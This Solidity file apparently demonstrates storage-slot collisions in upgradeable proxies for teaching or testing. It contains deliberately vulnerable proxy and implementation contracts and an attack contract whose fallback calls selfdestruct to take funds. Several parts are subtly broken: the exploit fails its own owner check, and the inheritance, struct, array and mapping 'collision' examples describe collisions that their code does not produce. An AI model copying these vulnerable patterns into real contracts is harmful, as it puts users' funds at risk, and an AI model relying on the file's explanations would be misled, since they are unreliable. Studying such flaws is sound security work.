// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title ProxyStorageCollision
 * @notice VULNERABLE: Storage layout conflicts between proxy and implementation
 * @dev This contract demonstrates how storage slot collisions can corrupt contract state
 *      and lead to critical vulnerabilities in upgradeable proxies.
 *
 * Vulnerability: CWE-662 (Improper Synchronization)
 * Severity: HIGH
 * Impact: State corruption, unauthorized access, fund loss
 *
 * Storage collision occurs when:
 * 1. Proxy uses certain storage slots for its own variables
 * 2. Implementation uses the same slots for different variables
 * 3. Delegatecall causes implementation to overwrite proxy's critical storage
 *
 * Real-world impact:
 * - Parity Wallet (historical) - Storage collision in library
 * - Multiple proxy upgrade failures due to storage layout changes
 * - Loss of admin control, fund draining, state corruption
 *
 * Attack scenario:
 * 1. Proxy stores `implementation` address in slot 0
 * 2. Implementation stores `owner` in slot 0
 * 3. When implementation sets owner, it overwrites implementation address!
 * 4. Proxy now delegates to attacker's contract
 */

/**
 * @notice VULNERABLE PROXY - Uses slot 0 for implementation
 */
contract VulnerableProxy {
    // PROBLEM: Using slot 0 for implementation
    address public implementation;  // Storage slot 0
    address public admin;           // Storage slot 1

    constructor(address _implementation) {
        implementation = _implementation;
        admin = msg.sender;
    }

    /**
     * @notice Upgrade implementation (simplified)
     */
    function upgradeTo(address newImplementation) external {
        require(msg.sender == admin, "Only admin");
        implementation = newImplementation;
    }

    /**
     * @notice Fallback delegates to implementation
     */
    fallback() external payable {
        address impl = implementation;
        assembly {
            calldatacopy(0, 0, calldatasize())
            let result := delegatecall(gas(), impl, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            switch result
            case 0 { revert(0, returndatasize()) }
            default { return(0, returndatasize()) }
        }
    }
}

/**
 * @notice VULNERABLE IMPLEMENTATION - Also uses slot 0
 */
contract VulnerableImplementation {
    // CRITICAL PROBLEM: Same storage layout as proxy!
    address public owner;    // Storage slot 0 - COLLISION!
    uint256 public balance;  // Storage slot 1 - COLLISION!

    /**
     * @notice Initialize implementation
     * @dev This will overwrite proxy's implementation address!
     */
    function initialize(address _owner) external {
        owner = _owner;  // DISASTER: Overwrites proxy's implementation variable!
    }

    /**
     * @notice Set new owner
     * @dev This also corrupts proxy state
     */
    function setOwner(address newOwner) external {
        require(msg.sender == owner, "Only owner");
        owner = newOwner;  // Overwrites slot 0 in proxy storage!
    }

    /**
     * @notice Deposit funds
     */
    function deposit() external payable {
        balance += msg.value;  // Overwrites slot 1 in proxy storage!
    }
}

/**
 * @notice ATTACK DEMONSTRATION
 */
contract StorageCollisionAttack {
    /**
     * @notice Exploit the storage collision
     * @dev This shows how an attacker can take control
     */
    function exploit(address proxyAddress) external {
        VulnerableProxy proxy = VulnerableProxy(payable(proxyAddress));

        // Step 1: Cast proxy to implementation interface
        VulnerableImplementation impl = VulnerableImplementation(proxyAddress);

        // Step 2: Call setOwner through proxy (delegatecall)
        // This overwrites proxy's implementation variable (slot 0)!
        impl.setOwner(address(this));

        // Step 3: Now proxy.implementation points to this attack contract
        // All future calls to proxy execute attacker's code!

        // Step 4: Deploy malicious implementation and "set owner" to that address
        // MaliciousImplementation malicious = new MaliciousImplementation();
        // impl.setOwner(address(malicious));

        // Success! Proxy now delegates to malicious contract
    }

    /**
     * @notice Malicious fallback to drain funds
     */
    fallback() external payable {
        // Once proxy delegates here, steal everything
        selfdestruct(payable(msg.sender));
    }
}

/**
 * @notice LEGACY PROXY PATTERN - Common vulnerable pattern
 */
contract LegacyProxyPattern {
    // VULNERABLE: Sequential storage layout
    address public implementation;  // slot 0
    address public owner;           // slot 1
    bool public initialized;        // slot 2

    // If implementation uses same layout, COLLISION!
}

/**
 * @notice UPGRADEABLE CONTRACT WITHOUT GAPS
 */
contract NoStorageGaps {
    address public owner;
    uint256 public value;

    // PROBLEM: If upgraded to add more variables,
    // they will collide with child contract storage!
}

/**
 * @notice CHILD CONTRACT EXTENDING PARENT
 */
contract ChildContract is NoStorageGaps {
    // COLLISION: These variables use same slots as parent!
    address public token;   // Collides with owner
    uint256 public amount;  // Collides with value
}

/**
 * @notice STRUCT LAYOUT COLLISION
 */
contract StructCollision {
    struct UserData {
        address user;
        uint256 balance;
    }

    // Proxy stores implementation here
    address public implementation;  // slot 0

    // Implementation stores struct here
    UserData public userData;  // Also starts at slot 0 if not careful!
}

/**
 * @notice ARRAY STORAGE COLLISION
 */
contract ArrayCollision {
    address public implementation;  // slot 0

    // Implementation V1
    uint256[] public values;  // slot 0 (length), keccak256(0) for data

    // If implementation variable is at slot 0,
    // setting array length corrupts it!
}

/**
 * @notice MAPPING COLLISION
 */
contract MappingCollision {
    // Proxy
    address public implementation;  // slot 0

    // Implementation uses mapping
    mapping(address => uint256) public balances;  // slot 0

    // Setting balances[someAddress] calculates:
    // keccak256(address, slot) - usually safe
    // But if implementation changes, could collide!
}
